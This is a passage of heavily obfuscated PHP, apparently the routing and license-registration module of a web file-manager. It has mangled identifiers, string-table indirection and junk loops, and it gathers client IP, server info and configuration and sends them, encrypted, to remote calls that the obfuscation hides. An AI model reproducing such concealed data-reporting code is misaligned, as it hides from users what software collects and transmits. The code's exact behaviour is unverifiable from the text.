$ïÇÒô‘Ø = false, $Ä‡¿©ê = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÔÕ±ĞšÎ][316])) { return parent::fileOutServer($—éÔ÷, $Ğá£âËû, $ïÇÒô‘Ø, $Ä‡¿©ê); } parent::fileOut($—éÔ÷, $Ğá£âËû, $ïÇÒô‘Ø, $Ä‡¿©ê); } public function fileOutImage($üäŠ¡É, $ÚÚÅŸÂà = 250) { if (strstr($this->endpoint, $_SERVER[ÔÕ±ĞšÎ][316])) { return parent::fileOutImageServer($üäŠ¡É, $ÚÚÅŸÂà); } parent::fileOutImage($üäŠ¡É, $ÚÚÅŸÂà); } public function fileOutLink($öŠ±›çí) { $Áïæ³ØŞ =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($öŠ±›çí, 0, 7) == $Áïæ³ØŞ[218]) { $öŠ±›çí = $Áïæ³ØŞ[219] . substr($öŠ±›çí, 7); } header($Áïæ³ØŞ[175] . $öŠ±›çí); die; } } define($_SERVER[ÔÕ±ĞšÎ][317], 1); define($_SERVER[ÔÕ±ĞšÎ][318], 2); goto aòÊË­ÖŒ™; d•éï¬´¦: if (strlen($wdueljoskc) < $_SERVER[ÔÕ±ĞšÎ][688]) { return; } class Application { private $defaultModule = "\151\x6e\144\x65\170"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($ğñà«ÑŠ) { $“š°Å•ô =& $_SERVER[ÔÕ±ĞšÎ]; $™ä¶¥ùò =& $_SERVER[ü¢¡ã”ä]; $¿‰¶×ì™ = explode($™ä¶¥ùò[0], trim($ğñà«ÑŠ, $™ä¶¥ùò[0])); $this->defaultModule = $¿‰¶×ì™[0] ? $¿‰¶×ì™[0] : $this->defaultModule; $—ƒ¤Ì½¢ = $“š°Å•ô[689]; if (strlen($—ƒ¤Ì½¢) < $“š°Å•ô[688]) { return; } $this->defaultController = $¿‰¶×ì™[1] ? $¿‰¶×ì™[1] : $this->defaultController; $this->defaultAction = $¿‰¶×ì™[2] ? $¿‰¶×ì™[2] : $this->defaultAction; $¹°ªíÇ¢ = $“š°Å•ô[690]; $this->gpoh251d49cf($™ä¶¥ùò[1], array($this, $™ä¶¥ùò[2])); } public function appRun($ï–Ç®Ò’) { $š¸«äôõ =& $_SERVER[ÔÕ±ĞšÎ]; $ ‹ç©Ìß =& $_SERVER[ü¢¡ã”ä]; $Éê¢–õ = explode($ ‹ç©Ìß[0], $ï–Ç®Ò’); $¤ÚÙ’ğ¯ = $š¸«äôõ[691]; if (!$¤ÚÙ’ğ¯) { return; } $éÖüúº = strtolower($Éê¢–õ[0]); $©°ÁÇŒ = $š¸«äôõ[692]; $Ø¨Èš = $ ‹ç©Ìß[3]; $³Ä—ŠÚÅ = $š¸«äôõ[693]; if (strlen($³Ä—ŠÚÅ) < $š¸«äôõ[694]) { return; } if ($éÖüúº == $ ‹ç©Ìß[4]) { $Ø¨Èš = $ ‹ç©Ìß[5]; $Éê¢–õ[0] = $ ‹ç©Ìß[6]; $Éê¢–õ[1] = $Éê¢–õ[1] . $ ‹ç©Ìß[7]; $ï–Ç®Ò’ = join($ ‹ç©Ìß[0], $Éê¢–õ); $ï–Ç®Ò’ = trim($ï–Ç®Ò’, $ ‹ç©Ìß[0]); } call_user_func(array($ ‹ç©Ìß[8], $ ‹ç©Ìß[9]), $Ø¨Èš . $ ‹ç©Ìß[10], $ï–Ç®Ò’); ActionCall($ï–Ç®Ò’); $Ö®³×öÑ = $š¸«äôõ[695]; while (strlen($Ö®³×öÑ) < $š¸«äôõ[696]) { if (!$Ö®³×öÑ) { break; } $Ö®³×öÑ++; } call_user_func(array($ ‹ç©Ìß[8], $ ‹ç©Ìß[9]), $Ø¨Èš . $ ‹ç©Ìß[11], $ï–Ç®Ò’); } private function autorun() { $§¨÷÷‹˜ =& $_SERVER[ü¢¡ã”ä]; global $config; if (count($config[$§¨÷÷‹˜[12]]) == 0) { return; } foreach ($config[$§¨÷÷‹˜[12]] as $¦›¦ªËÕ => $â‰ç©¹Ì) { $this->appRun($â‰ç©¹Ì); $ñ›Ì÷ıÚ = $_SERVER[ÔÕ±ĞšÎ][697]; if (!$ñ›Ì÷ıÚ) { return; } } } private function hosic6f1626a() { $ªÁ¬¹”ò =& $_SERVER[ÔÕ±ĞšÎ]; $„ˆ¹±á =& $_SERVER[ü¢¡ã”ä]; $ï¢ìÎÔ = $„ˆ¹±á[4]; $º°–„Ù˜ = $GLOBALS[$„ˆ¹±á[13]][$„ˆ¹±á[14]][0]; $¯‹ ËòÄ = $ªÁ¬¹”ò[698]; if (!$¯‹ ËòÄ) { return; } if (!$º°–„Ù˜ || strlen($º°–„Ù˜) <= strlen($ï¢ìÎÔ)) { return; } if (strtolower(substr($º°–„Ù˜, -strlen($ï¢ìÎÔ))) != $ï¢ìÎÔ) { return; } $­Ã´ÅúÍ = substr($º°–„Ù˜, 0, -strlen($ï¢ìÎÔ)); $¹½¿Éï° = array($„ˆ¹±á[4], $­Ã´ÅúÍ); $ÖØïäæ = array_slice($GLOBALS[$„ˆ¹±á[13]][$„ˆ¹±á[14]], 1); $GLOBALS[$„ˆ¹±á[13]][$„ˆ¹±á[14]] = array_merge($¹½¿Éï°, $ÖØïäæ); $GLOBALS[$„ˆ¹±á[13]][$„ˆ¹±á[15]] = implode($„ˆ¹±á[0], $GLOBALS[$„ˆ¹±á[13]][$„ˆ¹±á[14]]); $°¯óåª€ = $ªÁ¬¹”ò[699]; while (strlen($°¯óåª€) < $ªÁ¬¹”ò[694]) { if (!$°¯óåª€) { break; } $°¯óåª€++; } } private function cnou14e8c0f7() { $Û¡šËë€ =& $_SERVER[ÔÕ±ĞšÎ]; $˜‘å·ïÎ =& $_SERVER[ü¢¡ã”ä]; if ($GLOBALS[$˜‘å·ïÎ[13]][$˜‘å·ïÎ[15]] != $˜‘å·ïÎ[6]) { return; } $ÈúÜ¶èá = $_SERVER[$˜‘å·ïÎ[16]]; $úê¸ŸÃ¶ = $˜‘å·ïÎ[17]; $Ÿ­‹ä²Æ = $Û¡šËë€[700]; while ($Ÿ­‹ä²Æ < $Û¡šËë€[688]) { if ($Ÿ­‹ä²Æ >= 0) { break; } $Ÿ­‹ä²Æ++; } if (!strstr($ÈúÜ¶èá, $úê¸ŸÃ¶)) { return; } $÷âÛ“•’ = strrpos($ÈúÜ¶èá, $úê¸ŸÃ¶); $‰Û¸Øòš = substr($ÈúÜ¶èá, $÷âÛ“•’ + strlen($úê¸ŸÃ¶)); $¸ú—ÌæÜ = $Û¡šËë€[701]; while (strlen($¸ú—ÌæÜ) < $Û¡šËë€[696]) { if (!$¸ú—ÌæÜ) { break; } $¸ú—ÌæÜ++; } preg_match_all($˜‘å·ïÎ[18], $‰Û¸Øòš, $ßò²¡ÏÕ); $‰Û¸Øòš = trim($ßò²¡ÏÕ[0][0], $˜‘å·ïÎ[19]); $GLOBALS[$˜‘å·ïÎ[13]][$˜‘å·ïÎ[14]] = explode($˜‘å·ïÎ[19], $‰Û¸Øòš); $GLOBALS[$˜‘å·ïÎ[13]][$˜‘å·ïÎ[15]] = implode($˜‘å·ïÎ[0], $GLOBALS[$˜‘å·ïÎ[13]][$˜‘å·ïÎ[14]]); $«¾‡Ñ”Û = $Û¡šËë€[702]; while ($«¾‡Ñ”Û < $Û¡šËë€[696]) { if ($«¾‡Ñ”Û >= 0) { break; } $«¾‡Ñ”Û++; } } public function run() { $‹ãô÷ã =& $_SERVER[ÔÕ±ĞšÎ]; $—¼™±„‘ =& $_SERVER[ü¢¡ã”ä]; $this->cnou14e8c0f7(); $this->hosic6f1626a(); $Ï“¼¼¶¸ = $‹ãô÷ã[703]; if (strlen($Ï“¼¼¶¸) < $‹ãô÷ã[696]) { die; } $Ëºó¢ş = $GLOBALS[$—¼™±„‘[13]][$—¼™±„‘[14]]; $ŞÏ—Ÿü = $‹ãô÷ã[704]; $şãÈñ¶ä = $GLOBALS[$—¼™±„‘[13]][$—¼™±„‘[15]]; define($—¼™±„‘[20], isset($Ëºó¢ş[0]) && $Ëºó¢ş[0] ? $Ëºó¢ş[0] : $this->defaultModule); define($—¼™±„‘[21], isset($Ëºó¢ş[1]) && $Ëºó¢ş[0] ? $Ëºó¢ş[1] : $this->defaultController); $©¨Š®È = $‹ãô÷ã[705]; while ($©¨Š®È < $‹ãô÷ã[694]) { if ($©¨Š®È >= 0) { break; } $©¨Š®È++; } define($—¼™±„‘[22], isset($Ëºó¢ş[2]) && $Ëºó¢ş[0] ? $Ëºó¢ş[2] : $this->defaultAction); define($—¼™±„‘[23], MOD . $—¼™±„‘[0] . ST . $—¼™±„‘[0] . ACT); $_SERVER[$—¼™±„‘[24]] = strtolower(ACTION); $ëÂÎñ¼· = $‹ãô÷ã[706]; $this->autorun(); if (count($Ëºó¢ş) >= 3) { $this->appRun($şãÈñ¶ä); } else { $this->appRun(ACTION); } } private $gwnc99cefeab = array(); private $jtax3895d200 = ''; public function ygsuff5e2f9e() { $Ú¯Æ¢È¼ =& $_SERVER[ÔÕ±ĞšÎ]; $Šğ¡áéÁ =& $_SERVER[ü¢¡ã”ä]; $this->jnas6a49654c(); $this->hucp5779a876(); $îÖ¸Ñ¯‘ = $Ú¯Æ¢È¼[707]; if (!$îÖ¸Ñ¯‘) { return; } $this->oqst7e4e408c(); $this->rmqb241db383(); $ÔÕèõ±— = $Ú¯Æ¢È¼[708]; while (strlen($ÔÕèõ±—) < $Ú¯Æ¢È¼[709]) { if (!$ÔÕèõ±—) { break; } $ÔÕèõ±—++; } $this->odjf1d8c72f5(); $this->nlpfdbcb9e83(); $this->letg895d0393(); $this->gpoh251d49cf($Šğ¡áéÁ[25], array($this, $Šğ¡áéÁ[26])); $•ç÷Ğï = $Ú¯Æ¢È¼[710]; $this->gpoh251d49cf($Šğ¡áéÁ[27], array($this, $Šğ¡áéÁ[28])); $this->gpoh251d49cf($Šğ¡áéÁ[29], array($this, $Šğ¡áéÁ[30])); $this->gpoh251d49cf($Šğ¡áéÁ[31], array($this, $Šğ¡áéÁ[32])); $¿­è—»¶ = $Ú¯Æ¢È¼[711]; } public function jbspd8ffab00($ŠÊÕóóš) { $¢ÂË²ê =& $_SERVER[ÔÕ±ĞšÎ]; $ÃÕÂ¡Øê =& $_SERVER[ü¢¡ã”ä]; $™³ºÊ‡Õ = Model($ÃÕÂ¡Øê[33])->get(); $Äğ¦šôç = $¢ÂË²ê[712]; while (strlen($Äğ¦šôç) < $¢ÂË²ê[688]) { if (!$Äğ¦šôç) { break; } $Äğ¦šôç++; } $éÔÎéûŸ = array($ÃÕÂ¡Øê[34], $ÃÕÂ¡Øê[35], $ÃÕÂ¡Øê[36], $ÃÕÂ¡Øê[37], $ÃÕÂ¡Øê[38], $ÃÕÂ¡Øê[39], $ÃÕÂ¡Øê[40], $ÃÕÂ¡Øê[41], $ÃÕÂ¡Øê[42], $ÃÕÂ¡Øê[43], $ÃÕÂ¡Øê[44], $ÃÕÂ¡Øê[45], $ÃÕÂ¡Øê[46], $ÃÕÂ¡Øê[47], $ÃÕÂ¡Øê[48], $ÃÕÂ¡Øê[49], $ÃÕÂ¡Øê[50], $ÃÕÂ¡Øê[51], $ÃÕÂ¡Øê[52], $ÃÕÂ¡Øê[53], $ÃÕÂ¡Øê[54], $ÃÕÂ¡Øê[55], $ÃÕÂ¡Øê[56], $ÃÕÂ¡Øê[57], $ÃÕÂ¡Øê[58], $ÃÕÂ¡Øê[59], $ÃÕÂ¡Øê[60], $ÃÕÂ¡Øê[61], $ÃÕÂ¡Øê[62], $ÃÕÂ¡Øê[63], $ÃÕÂ¡Øê[64], $ÃÕÂ¡Øê[65], $ÃÕÂ¡Øê[66], $ÃÕÂ¡Øê[67], $ÃÕÂ¡Øê[68], $ÃÕÂ¡Øê[69], $ÃÕÂ¡Øê[70], $ÃÕÂ¡Øê[71], $ÃÕÂ¡Øê[72], $ÃÕÂ¡Øê[73], $ÃÕÂ¡Øê[74], $ÃÕÂ¡Øê[75], $ÃÕÂ¡Øê[76], $ÃÕÂ¡Øê[77], $ÃÕÂ¡Øê[78], $ÃÕÂ¡Øê[79], $ÃÕÂ¡Øê[80], $ÃÕÂ¡Øê[81], $ÃÕÂ¡Øê[82], $ÃÕÂ¡Øê[83], $ÃÕÂ¡Øê[84], $ÃÕÂ¡Øê[85]); foreach ($éÔÎéûŸ as $´¶ƒ¨¨) { $å†Áî‰ = $GLOBALS[$ÃÕÂ¡Øê[86]][$ÃÕÂ¡Øê[87]][$´¶ƒ¨¨]; $ôÓÅ ı» = $¢ÂË²ê[713]; if (isset($™³ºÊ‡Õ[$´¶ƒ¨¨])) { $å†Áî‰ = $™³ºÊ‡Õ[$´¶ƒ¨¨]; } $ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[89]][$´¶ƒ¨¨] = $å†Áî‰; } $ªºâÙÄ = $ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[89]][$ÃÕÂ¡Øê[46]]; unset($ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[90]][$ÃÕÂ¡Øê[91]]); $òØÒÙİ = $¢ÂË²ê[714]; unset($ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[90]][$ÃÕÂ¡Øê[92]]); $ãİ Ú¹Ú = $¢ÂË²ê[715]; unset($ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[89]][$ÃÕÂ¡Øê[46]]); $ÜÀç‘İÜ = $¢ÂË²ê[716]; if (strlen($ÜÀç‘İÜ) < $¢ÂË²ê[688]) { die; } unset($ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[89]][$ÃÕÂ¡Øê[93]]); $Îİì­ó = $¢ÂË²ê[717]; while (strlen($Îİì­ó) < $¢ÂË²ê[688]) { if (!$Îİì­ó) { break; } $Îİì­ó++; } $ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[89]][$ÃÕÂ¡Øê[94]] = array($ÃÕÂ¡Øê[95] => (int) $ªºâÙÄ[$ÃÕÂ¡Øê[96]], $ÃÕÂ¡Øê[97] => (int) _get($ªºâÙÄ, $ÃÕÂ¡Øê[98], 0)); $½¾ò×Ÿ§ = substr(md5($ÃÕÂ¡Øê[99] . get_client_ip() . $™³ºÊ‡Õ[$ÃÕÂ¡Øê[100]]), 0, 15); $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[102]] = Mcrypt::encode(Session::sign(), $½¾ò×Ÿ§, 3600 * 24); $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[103]] = Action($ÃÕÂ¡Øê[104])->accessToken(); $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[105]] = md5($_SERVER[$ÃÕÂ¡Øê[106]] . $™³ºÊ‡Õ[$ÃÕÂ¡Øê[100]]); $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[107]] = base64_encode(serverInfo()); $Û£š‘¼ï = $¢ÂË²ê[718]; if (!$Û£š‘¼ï) { die; } $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[108]] = $this->jtax3895d200; if ($™³ºÊ‡Õ[$ÃÕÂ¡Øê[108]] != $ÃÕÂ¡Øê[109]) { $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[110]] = $™³ºÊ‡Õ[$ÃÕÂ¡Øê[110]]; $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[111]] = $™³ºÊ‡Õ[$ÃÕÂ¡Øê[111]]; $´¹ÖÑ¶ª = rand_string(10) . $this->jtax3895d200 . rand_string(5); $ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[112]][$ÃÕÂ¡Øê[113]] = $this->vfoz6b4c65c7($´¹ÖÑ¶ª, $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[105]]); } if ($this->jtax3895d200 == $ÃÕÂ¡Øê[109]) { $ŠÊÕóóš[$ÃÕÂ¡Øê[88]][$ÃÕÂ¡Øê[89]][$ÃÕÂ¡Øê[94]][$ÃÕÂ¡Øê[98]] = 0; } $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[114]] = $this->versionPluginFilter(); $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[115]] = _get($this->gwnc99cefeab, $ÃÕÂ¡Øê[116], $ÃÕÂ¡Øê[6]); if (KodUser::isRoot() && $this->config[$ÃÕÂ¡Øê[117]]) { $ŠÊÕóóš[$ÃÕÂ¡Øê[101]][$ÃÕÂ¡Øê[118]] = WEB_ROOT; } return $ŠÊÕóóš; } private function nlpfdbcb9e83() { $ŠË“ŒÜ =& $_SERVER[ÔÕ±ĞšÎ]; $¿ğÓÄãâ =& $_SERVER[ü¢¡ã”ä]; $ƒÂâúÆ = $_SERVER[$¿ğÓÄãâ[24]] == $¿ğÓÄãâ[119]; $±¦ıÂığ = $ŠË“ŒÜ[719]; if (!$±¦ıÂığ) { die; } if ($_SERVER[$¿ğÓÄãâ[24]] == $¿ğÓÄãâ[120] && $_GET[$¿ğÓÄãâ[121]] == $¿ğÓÄãâ[122]) { $ƒÂâúÆ = !0; } if ($ƒÂâúÆ) { $ú‚¡ö¼´ = array($¿ğÓÄãâ[108] => $this->jtax3895d200, $¿ğÓÄãâ[123] => $this->urnkd02310f9(), $¿ğÓÄãâ[124] => Model($¿ğÓÄãâ[125])->count()); if ($this->jtax3895d200 != $¿ğÓÄãâ[109]) { $Êóü±›¼ = _get($this->gwnc99cefeab, $¿ğÓÄãâ[126]); if ($Êóü±›¼) { $ú‚¡ö¼´[$¿ğÓÄãâ[127]] = $Êóü±›¼; $ú‚¡ö¼´[$¿ğÓÄãâ[128]] = strtotime(_get($this->gwnc99cefeab, $¿ğÓÄãâ[129])); $ú‚¡ö¼´[$¿ğÓÄãâ[130]] = _get($this->gwnc99cefeab, $¿ğÓÄãâ[116]); } $ƒŠÑããÏ = Model($¿ğÓÄãâ[33])->get($¿ğÓÄãâ[131], $¿ğÓÄãâ[6], !0); if (is_string($ƒŠÑããÏ) && substr($ƒŠÑããÏ, 0, 1) == $¿ğÓÄãâ[132]) { $ƒŠÑããÏ = json_decode_force($ƒŠÑããÏ); } if (is_array($ƒŠÑããÏ) && $ƒŠÑããÏ[$¿ğÓÄãâ[133]] && strstr($ƒŠÑããÏ[$¿ğÓÄãâ[133]], $¿ğÓÄãâ[134])) { $µÅâæ‰Ô = explode($¿ğÓÄãâ[134], $ƒŠÑããÏ[$¿ğÓÄãâ[133]]); $ú‚¡ö¼´[$¿ğÓÄãâ[135]] = $µÅâæ‰Ô[0]; } } $ú‚¡ö¼´ = $this->yxpi3af00147(json_encode($ú‚¡ö¼´), md5($¿ğÓÄãâ[136])); $îãÄÁ° = array($¿ğÓÄãâ[137] => $ú‚¡ö¼´); $Ö¾“çÕÓ = $ŠË“ŒÜ[720]; if (!$Ö¾“çÕÓ) { die; } call_user_func(array($¿ğÓÄãâ[138], $¿ğÓÄãâ[139]), $îãÄÁ°); $ÉÆ­ §½ = $ŠË“ŒÜ[721]; while (strlen($ÉÆ­ §½) < $ŠË“ŒÜ[688]) { if (!$ÉÆ­ §½) { break; } $ÉÆ­ §½++; } } if ($this->jtax3895d200 == $¿ğÓÄãâ[109]) { return; } $³¾íŠŠö = array($¿ğÓÄãâ[140], $¿ğÓÄãâ[141], $¿ğÓÄãâ[142], $¿ğÓÄãâ[143], $¿ğÓÄãâ[144], $¿ğÓÄãâ[145]); $£‰ŞüÄ« = Model($¿ğÓÄãâ[33])->get(); $Š„Ç†Ï· = $ŠË“ŒÜ[722]; if (!$Š„Ç†Ï·) { return; } $îãÄÁ° = array($¿ğÓÄãâ[146] => $£‰ŞüÄ«[$¿ğÓÄãâ[34]], $¿ğÓÄãâ[147] => $£‰ŞüÄ«[$¿ğÓÄãâ[35]], $¿ğÓÄãâ[148] => $¿ğÓÄãâ[6]); $¦š¢Ğ¨Ø = $ŠË“ŒÜ[723]; if (!$¦š¢Ğ¨Ø) { die; } foreach ($³¾íŠŠö as $¿„ìÂå¢) { if (!isset($£‰ŞüÄ«[$¿„ìÂå¢]) || !$£‰ŞüÄ«[$¿„ìÂå¢]) { continue; } $îãÄÁ°[$¿„ìÂå¢] = $£‰ŞüÄ«[$¿„ìÂå¢]; $È¤ä«€¢ = $ŠË“ŒÜ[724]; while ($È¤ä«€¢ < $ŠË“ŒÜ[725]) { if ($È¤ä«€¢ >= 0) { break; } $È¤ä«€¢++; } } call_user_func(array($¿ğÓÄãâ[138], $¿ğÓÄãâ[139]), $îãÄÁ°); } private function rmqb241db383() { $Ë¨È«ğ˜ =& $_SERVER[ÔÕ±ĞšÎ]; $Ëáå´¡ =& $_SERVER[ü¢¡ã”ä]; if ($_SERVER[$Ëáå´¡[24]] != $Ëáå´¡[149]) { return; } if (!KodUser::isRoot()) { die; } $ªì±ÁâØ = $GLOBALS[$Ëáå´¡[13]]; if (isset($ªì±ÁâØ[$Ëáå´¡[150]])) { $this->dcpw7ca53c62(); die; } if (isset($ªì±ÁâØ[$Ëáå´¡[151]]) && isset($ªì±ÁâØ[$Ëáå´¡[151]]) == $Ëáå´¡[122]) { $ªì±ÁâØ[$Ëáå´¡[152]] = Model($Ëáå´¡[33])->get($Ëáå´¡[153]); } if (!isset($ªì±ÁâØ[$Ëáå´¡[152]]) || strlen($ªì±ÁâØ[$Ëáå´¡[152]]) != 16) { show_json($Ëáå´¡[154] . $ªì±ÁâØ[$Ëáå´¡[152]], !1); } $èüÊ“º = Model($Ëáå´¡[33])->get($Ëáå´¡[100]); $Ë‡†·Ã = md5($_SERVER[$Ëáå´¡[106]] . $èüÊ“º); $Œ›¼•Ê¾ = $Ë¨È«ğ˜[726]; if (!$Œ›¼•Ê¾) { die; } $°Ì»ÏáÓ = array($Ëáå´¡[152] => $ªì±ÁâØ[$Ëáå´¡[152]], $Ëáå´¡[155] => rand_string(16), $Ëáå´¡[156] => $Ëáå´¡[136], $Ëáå´¡[157] => $Ëáå´¡[158], $Ëáå´¡[159] => $_SERVER[$Ëáå´¡[160]], $Ëáå´¡[161] => $_SERVER[$Ëáå´¡[162]], $Ëáå´¡[163] => $_SERVER[$Ëáå´¡[164]], $Ëáå´¡[105] => $Ë‡†·Ã, $Ëáå´¡[165] => Model($Ëáå´¡[33])->get($Ëáå´¡[131])); $ñáÇ ­ = $Ë¨È«ğ˜[727]; if (isset($ªì±ÁâØ[$Ëáå´¡[151]]) && isset($ªì±ÁâØ[$Ëáå´¡[151]]) == $Ëáå´¡[122]) { $°Ì»ÏáÓ[$Ëáå´¡[151]] = md5($°Ì»ÏáÓ[$Ëáå´¡[152]] . $Ëáå´¡[166] . $°Ì»ÏáÓ[$Ëáå´¡[155]]); } if ($ªì±ÁâØ[$Ëáå´¡[167]] == $Ëáå´¡[168]) { $«¿Šë­ç = $this->yxpi3af00147($Ë‡†·Ã, $Ëáå´¡[169]); $–ıôôØ = $this->vfoz6b4c65c7(json_encode($°Ì»ÏáÓ), $Ë‡†·Ã . $Ëáå´¡[170], 3); $–ıôôØ = $–ıôôØ . $Ëáå´¡[171] . $_SERVER[$Ëáå´¡[160]]; $êøœŒ†Ó = $this->ajxi1ebfa190($Ëáå´¡[172] . $«¿Šë­ç . $Ëáå´¡[173] . $–ıôôØ, -1); show_json($êøœŒ†Ó, !0); } else { if ($ªì±ÁâØ[$Ëáå´¡[167]] == $Ëáå´¡[174]) { $“â®Ìüß = substr(md5($Ëáå´¡[175] . $Ë‡†·Ã), 12, 15) . $Ëáå´¡[176]; $–ıôôØ = $this->huoq9e74a2d3(trim($ªì±ÁâØ[$Ëáå´¡[177]]), $“â®Ìüß, 2); $Á‡¸ë“‰ = json_decode($–ıôôØ, !0); if (!is_array($Á‡¸ë“‰) || !is_array($Á‡¸ë“‰[$Ëáå´¡[178]]) || $Á‡¸ë“‰[$Ëáå´¡[152]] != !0) { $ëóµ•èÎ = $Ëáå´¡[179]; $ºô–àş = $Á‡¸ë“‰[$Ëáå´¡[178]] ? $Ëáå´¡[180] . $Á‡¸ë“‰[$Ëáå´¡[178]] : $ëóµ•èÎ; show_json($ºô–àş, !1); } else { $°Ì»ÏáÓ[$Ëáå´¡[155]] = $Á‡¸ë“‰[$Ëáå´¡[178]][$Ëáå´¡[181]]; } } else { $Á‡¸ë“‰ = $this->ajxi1ebfa190($Ëáå´¡[182], $°Ì»ÏáÓ, 10); $Çà¥‡§‰ = $Ë¨È«ğ˜[728]; } } if (!is_array($Á‡¸ë“‰) || !is_array($Á‡¸ë“‰[$Ëáå´¡[178]]) || $Á‡¸ë“‰[$Ëáå´¡[152]] != !0) { $ëóµ•èÎ = LNG($Ëáå´¡[183]); $ºô–àş = $Á‡¸ë“‰[$Ëáå´¡[178]] ? $Ëáå´¡[180] . $Á‡¸ë“‰[$Ëáå´¡[178]] : $ëóµ•èÎ; show_json($ºô–àş, !1); } $Æ¯œÏáÛ = $Á‡¸ë“‰[$Ëáå´¡[178]]; $˜ºÄÉ = $this->firg094b8e06($Æ¯œÏáÛ[$Ëáå´¡[184]]); $„Íü´‹  = $Ë¨È«ğ˜[729]; while (strlen($„Íü´‹ ) < $Ë¨È«ğ˜[694]) { if (!$„Íü´‹ ) { break; } $„Íü´‹ ++; } if (!$˜ºÄÉ || $˜ºÄÉ != $Æ¯œÏáÛ[$Ëáå´¡[129]]) { $½Û™ˆ½Œ = array($Ëáå´¡[185] => Model($Ëáå´¡[33])->get($Ëáå´¡[100]), $Ëáå´¡[186] => $_SERVER[$Ëáå´¡[106]], $Ëáå´¡[187] => this_url(), $Ëáå´¡[161] => $_SERVER[$Ëáå´¡[162]]); $–ıôôØ = $this->hctqbafca1a1(json_encode($½Û™ˆ½Œ)); $this->ajxi1ebfa190($Ëáå´¡[188] . $–ıôôØ); show_json(LNG($Ëáå´¡[189]), !0); } $¢°¬—Â§ = array($Ëáå´¡[153] => $Æ¯œÏáÛ[$Ëáå´¡[190]], $Ëáå´¡[191] => $Æ¯œÏáÛ[$Ëáå´¡[192]], $Ëáå´¡[193] => rand_string(16), $Ëáå´¡[108] => $Æ¯œÏáÛ[$Ëáå´¡[194]]); if ($°Ì»ÏáÓ[$Ëáå´¡[155]]) { $¢°¬—Â§[$Ëáå´¡[193]] = $°Ì»ÏáÓ[$Ëáå´¡[155]]; } $öé½’¥ = substr(md5($¢°¬—Â§[$Ëáå´¡[191]]), 10, 10); $öæõÈìš = $öé½’¥ . $¢°¬—Â§[$Ëáå´¡[108]] . $¢°¬—Â§[$Ëáå´¡[193]]; $†µõ×ß¢ = $Ë¨È«ğ˜[730]; $¢°¬—Â§[$Ëáå´¡[110]] = strrev(base64_encode($this->yxpi3af00147($öæõÈìš, $Ëáå´¡[195]))); $ÒéÜØ÷´ = rand_string(16); $²ÕüäàÂ = $Ë¨È«ğ˜[731]; if (!$²ÕüäàÂ) { die; } $’±Óª = $ÒéÜØ÷´ . $¢°¬—Â§[$Ëáå´¡[108]] . $this->yxpi3af00147(md5($¢°¬—Â§[$Ëáå´¡[153]]), $ÒéÜØ÷´); $×¶¢éş± = $Ë¨È«ğ˜[732]; if (!$×¶¢éş±) { die; } $¢°¬—Â§[$Ëáå´¡[111]] = base64_encode(strrev($this->yxpi3af00147($’±Óª, $Ëáå´¡[196]))); $„şéŒÄ = $Ë¨È«ğ˜[733]; if (!$„şéŒÄ) { return; } if ($Æ¯œÏáÛ[$Ëáå´¡[197]] && $Æ¯œÏáÛ[$Ëáå´¡[197]] >= 1) { Model($Ëáå´¡[33])->setDeep($Ëáå´¡[198], $Ëáå´¡[122]); } Model($Ëáå´¡[33])->set($¢°¬—Â§); $Ú°¢ˆÊÁ = md5($_SERVER[$Ëáå´¡[106]] . strrev($èüÊ“º) . $¢°¬—Â§[$Ëáå´¡[191]]); $Èà•ÒàÀ = $Ë¨È«ğ˜[734]; if (strlen($Èà•ÒàÀ) < $Ë¨È«ğ˜[688]) { die; } $÷ô¨ïÔô = strrev(substr($Ú°¢ˆÊÁ, 10, 16)); $¾õöä¹ = $this->vfoz6b4c65c7(json_encode($Æ¯œÏáÛ), $Ú°¢ˆÊÁ); $µŸôàÍÃ = array_to_keyvalue(Model($Ëáå´¡[7])->listData(), $Ëáå´¡[199]); $ë Øë‰· = $µŸôàÍÃ[$Ëáå´¡[200]]; $·©·á = $Ë¨È«ğ˜[735]; if (strlen($·©·á) < $Ë¨È«ğ˜[694]) { die; } $ÜË½‘ñ‚ = array(); $ÜË½‘ñ‚[$÷ô¨ïÔô] = $¾õöä¹; $Êœ£ıîŞ = $Ë¨È«ğ˜[736]; while (strlen($Êœ£ıîŞ) < $Ë¨È«ğ˜[694]) { if (!$Êœ£ıîŞ) { break; } $Êœ£ıîŞ++; } Model($Ëáå´¡[7])->update($ë Øë‰·[$Ëáå´¡[201]], array($Ëáå´¡[202] => $ÜË½‘ñ‚)); $İâ¨¥¢æ = $Ë¨È«ğ˜[737]; while (strlen($İâ¨¥¢æ) < $Ë¨È«ğ˜[696]) { if (!$İâ¨¥¢æ) { break; } $İâ¨¥¢æ++; } $this->gwnc99cefeab = $Æ¯œÏáÛ; $this->jtax3895d200 = $¢°¬—Â§[$Ëáå´¡[108]]; $this->licenseRegistSuccess(); $ˆç«Ş¯± = $Ë¨È«ğ˜[738]; if (strlen($ˆç«Ş¯±) < $Ë¨È«ğ˜[725]) { return; } 